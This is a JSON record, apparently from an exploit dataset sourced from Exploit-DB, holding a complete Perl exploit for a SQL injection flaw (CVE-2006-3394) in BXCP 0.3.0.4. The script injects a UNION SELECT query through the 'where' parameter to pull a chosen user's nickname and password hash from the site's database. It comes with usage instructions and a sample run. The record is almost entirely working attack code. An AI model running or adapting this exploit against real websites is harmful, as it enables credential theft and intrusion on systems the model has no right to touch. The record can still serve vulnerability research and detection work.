{
  "id": "1975",
  "title": "BXCP 0.3.0.4 - &#039;where&#039; SQL Injection",
  "cve": "CVE-2006-3394",
  "vuln_type": "sqli",
  "code": "#!/usr/bin/perl\r\n\r\nuse IO::Socket;\r\n\r\nprint q{\r\n-------------------------------------------------------------------------------------\r\nBXCP exploit by x23 ~ curse-crew.de ~ geekbar.cx.la ~ geeknet.uttx.net\r\nuse: bxcp.pl [server] [dir] [id]\r\nsample:\r\n$ perl bxcp.pl bxcp.com / 1\r\n~ connecting\r\n~ exploiting\r\n~ hash: *censored* ;D\r\n-------------------------------------------------------------------------------------\r\n\r\n};\r\n\r\n$webpage =   $ARGV[0];\r\n$directory = $ARGV[1];\r\n$vic_id =    $ARGV[2];\r\n\r\nif (!$vic_id) { die \"~ read how to use ;)\\n\"; }\r\n\r\n$get = \"http://\".$webpage.$directory.\"index.php?mod=files&action=view&where=-1+UNION+\";\r\n$get .= \"SELECT+users_nick,0,users_pwd,0,0,0,0,0,0,0,0,0,0,0,0+FROM+{pre}_users+WHERE+users_id=\";\r\n$get .= $vic_id;\r\n\r\nprint \"~ connecting\\n\";\r\n$sock = IO::Socket::INET->new(Proto=>\"tcp\", PeerAddr=>\"$webpage\",\r\nPeerPort=>\"80\") || die \"[+] Can't connect to Server\\n\";\r\nprint \"~ exploiting\\n\";\r\nprint $sock \"GET $get HTTP/1.1\\n\";\r\nprint $sock \"Host: $webpage\\n\";\r\nprint $sock \"Accept: */*\\n\";\r\nprint $sock \"User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.8.0.4) Gecko/20060508 Firefox/1.5.0.4\\n\";\r\nprint $sock \"Connection: close\\n\\n\";\r\n\r\nwhile ($answer = <$sock>) {\r\n  #print $answer;\r\n  if ($answer =~ /([0-9a-f]{32})\\n/) {\r\n     print \"~ hash: $1\\n\";\r\n     break;\r\n  }\r\n}\r\n\r\nclose($sock);\r\n\r\n# milw0rm.com [2006-07-02]",
  "url": "https://www.exploit-db.com/exploits/1975"
}